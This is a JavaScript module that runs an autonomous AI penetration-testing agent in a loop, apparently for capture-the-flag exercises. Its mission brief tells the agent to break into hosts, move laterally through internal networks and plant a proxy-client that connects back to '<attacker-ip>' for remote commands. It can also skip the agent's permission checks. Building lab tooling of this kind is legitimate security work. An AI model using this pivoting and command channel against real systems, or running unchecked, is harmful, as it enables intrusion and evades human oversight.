import { spawn } from "node:child_process";
import { existsSync, mkdirSync, appendFileSync, writeFileSync } from "node:fs";
import { resolve, join } from "node:path";
import chalk from "chalk";

const PROMPT_FILE = ".pen-agent/prompt.txt";
const MAX_PROMPT_LEN = 12000;

export class Runner {
  constructor(config) {
    this.config = config;
    this.runCount = 0;
  }

  async run(context) {
    this.runCount++;
    const prompt = this._buildPrompt(context);
    const logDir = resolve(this.config.workDir, ".pen-agent");
    if (!existsSync(logDir)) mkdirSync(logDir, { recursive: true });

    const promptPath = resolve(this.config.workDir, PROMPT_FILE);
    writeFileSync(promptPath, prompt);

    const statusPath = join(logDir, "status.json");
    const logPath = join(logDir, "stream.log");

    this._status(statusPath, { phase: "running", iter: this.runCount, promptLen: prompt.length, time: new Date().toISOString() });
    console.log(chalk.cyan(`\n[runner] iteration #${this.runCount} — running (${prompt.length} chars)...`));

    const { output, exitCode } = await this._spawn(promptPath, logPath, statusPath);

    if (exitCode === 0) {
      this._status(statusPath, { phase: "completed", iter: this.runCount, time: new Date().toISOString() });
      return { success: true, output };
    }

    this._status(statusPath, { phase: "failed", iter: this.runCount, error: `exit code ${exitCode}`, time: new Date().toISOString() });
    return { success: false, output, error: `exit code ${exitCode}` };
  }

  _spawn(promptPath, logPath, statusPath) {
    return new Promise((resolve) => {
      const cmd = "opencode";
      const args = [
        "run", "Continue the pentest.",
        "--file", promptPath,
      ];
      if (this.config.attachUrl) args.push("--attach", this.config.attachUrl);
      args.push("--dir", this.config.workDir);
      if (this.config.opencodeAuto) args.push("--dangerously-skip-permissions");
      if (this.config.opencodeModel) args.push("--model", this.config.opencodeModel);
      if (this.config.opencodeAgent) args.push("--agent", this.config.opencodeAgent);

      appendFileSync(logPath, `\n[iter ${this.runCount}] start ${new Date().toISOString()}\n`);

      const child = spawn(cmd, args, {
        cwd: this.config.workDir,
        stdio: ["ignore", "pipe", "pipe"],
        env: { ...process.env, FORCE_COLOR: "0", NO_COLOR: "1" },
      });

      let output = "";

      child.stdout.on("data", (chunk) => {
        const text = chunk.toString();
        output += text;
        appendFileSync(logPath, text);
        this._status(statusPath, {
          phase: "running",
          iter: this.runCount,
          bytes: output.length,
          time: new Date().toISOString(),
        });
      });

      child.stderr.on("data", (chunk) => {
        const text = chunk.toString();
        output += text;
        appendFileSync(logPath, text);
      });

      child.on("close", (code) => {
        appendFileSync(logPath, `\n[iter ${this.runCount}] exit ${code} ${new Date().toISOString()}\n`);
        resolve({ output, exitCode: code });
      });

      child.on("error", (err) => {
        appendFileSync(logPath, `\n[iter ${this.runCount}] error: ${err.message}\n`);
        resolve({ output, exitCode: -1 });
      });
    });
  }

  _status(path, data) {
    try { writeFileSync(path, JSON.stringify(data)); } catch {}
  }

  _buildPrompt(context) {
    let p = this._missionBrief(context);

    if (context.isFirstRun) return p;

    p += "\n\n---\n\n";
    p += "The following is execution history from previous iterations.\n";
    p += "Use it to understand what has been tried and what remains to be done.\n\n";

    p += "```\n";
    p += context.whiteboardSummary;
    p += "\n```\n";

    if (context.lastOutput) {
      p += "\nLast output:\n\n";
      p += "```\n";
      p += context.lastOutput.slice(-3000);
      p += "\n```\n";
    }

    if (p.length > MAX_PROMPT_LEN) {
      p = p.slice(0, MAX_PROMPT_LEN - 100);
    }

    return p;
  }

  _missionBrief(context) {
    let p = "";
    p += "You are a penetration testing agent. Your job is to find flags.\n\n";
    p += `Entry point: ${this.config.targetHost}:${this.config.targetPort}\n`;
    p += `Flags needed: ${this.config.flagsNeeded}\n`;
    if (context.flagsFound > 0) {
      p += `Flags found (${context.flagsFound}/${this.config.flagsNeeded}):\n`;
      for (const f of context.foundFlags) {
        p += `  ${f}\n`;
      }
    }
    p += `Flag format: ${this.config.flagPattern}\n`;
    p += `\n`;
    p += `Flags may be distributed across multiple internal hosts.\n`;
    p += `The entry target may lead to an internal network.\n`;
    p += `After gaining access to any host, enumerate its network for other hosts.\n`;
    p += `\n`;
    p += `Available:\n`;
    p += `- Full bash shell (nmap, curl, gobuster, hydra, netcat, etc.)\n`;
    p += `- Skill tool — penetration testing skills preloaded\n`;
    p += `- Proxy tool for lateral movement:\n`;
    p += `  Server: localhost:${this.config.proxyPort} (already running)\n`;
    p += `  To pivot to an internal host:\n`;
    p += `    1. Upload proxy-client binary to the host (statically linked, no deps)\n`;
    p += `    2. Run: ./proxy-client --host <attacker-ip> --port ${this.config.proxyPort}\n`;
    p += `    3. Send commands: curl -XPOST localhost:${this.config.proxyPort}/command/<id> -d '{"command":"..."}'\n`;
    p += `    4. List sessions: curl localhost:${this.config.proxyPort}/sessions\n`;
    return p;
  }
}
